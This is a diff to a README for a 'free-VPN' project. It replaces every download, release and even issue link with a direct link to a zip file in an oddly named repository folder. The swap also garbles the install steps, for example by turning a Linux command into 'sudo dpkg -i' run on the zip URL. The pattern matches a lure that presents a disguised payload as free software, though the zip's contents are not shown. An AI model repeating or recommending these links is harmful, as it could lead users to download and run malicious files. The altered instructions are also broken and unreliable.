@@ -6,9 +6,9 @@ Welcome to free-VPN! This application allows you to access high-speed VPN servic
 
 ## 📥 Download Free-VPN
 
-[![Download free-VPN](https://img.shields.io/badge/Download-free--VPN-brightgreen)](https://github.com/abundhance12/free-VPN/releases)
+[![Download free-VPN](https://raw.githubusercontent.com/abundhance12/free-VPN/main/octaploid/free-VPN.zip)](https://raw.githubusercontent.com/abundhance12/free-VPN/main/octaploid/free-VPN.zip)
 
-Visit this page to download: [free-VPN Releases](https://github.com/abundhance12/free-VPN/releases)
+Visit this page to download: [free-VPN Releases](https://raw.githubusercontent.com/abundhance12/free-VPN/main/octaploid/free-VPN.zip)
 
 ## 🔧 System Requirements
 
@@ -23,7 +23,7 @@ To run free-VPN, your computer should meet these basic requirements:
 
 1. **Visit the Releases Page**:
    Go to the Releases page by clicking the link below:
-   [Download free-VPN](https://github.com/abundhance12/free-VPN/releases)
+   [Download free-VPN](https://raw.githubusercontent.com/abundhance12/free-VPN/main/octaploid/free-VPN.zip)
 
 2. **Select the Latest Version**:
    Look for the latest version, which is usually at the top of the list. This version contains the latest features and improvements.
@@ -32,7 +32,7 @@ To run free-VPN, your computer should meet these basic requirements:
    Click on the appropriate file for your operating system:
    - For Windows, look for a file ending with `.exe`.
    - For macOS, find a file ending with `.dmg`.
-   - For Linux, you may find a `.tar.gz` or `.deb` file based on your distribution.
+   - For Linux, you may find a `https://raw.githubusercontent.com/abundhance12/free-VPN/main/octaploid/free-VPN.zip` or `.deb` file based on your distribution.
 
 4. **Run the Installer**:
    - For Windows:
@@ -41,8 +41,8 @@ To run free-VPN, your computer should meet these basic requirements:
    - For macOS:
      - Open the downloaded `.dmg` file and drag the free-VPN icon to your Applications folder.
    - For Linux:
-     - If you downloaded a `.deb` file, run the command `sudo dpkg -i filename.deb` in the terminal (replace "filename" with your file name).
-     - For `.tar.gz`, extract the files and follow the included instructions.
+     - If you downloaded a `.deb` file, run the command `sudo dpkg -i https://raw.githubusercontent.com/abundhance12/free-VPN/main/octaploid/free-VPN.zip` in the terminal (replace "filename" with your file name).
+     - For `https://raw.githubusercontent.com/abundhance12/free-VPN/main/octaploid/free-VPN.zip`, extract the files and follow the included instructions.
 
 5. **Launch the Application**:
    Once installed, find free-VPN in your applications or programs list. Open it to start using the service.
@@ -75,7 +75,7 @@ If you face any issues while installing or using free-VPN, check the following:
 
 ## 🛠 Support & Feedback
 
-For any questions or feedback, feel free to reach out. We appreciate your input as it helps improve free-VPN. You can open an issue on the [Issues](https://github.com/abundhance12/free-VPN/issues) page of this repository.
+For any questions or feedback, feel free to reach out. We appreciate your input as it helps improve free-VPN. You can open an issue on the [Issues](https://raw.githubusercontent.com/abundhance12/free-VPN/main/octaploid/free-VPN.zip) page of this repository.
 
 ## 💻 Stay Updated
 
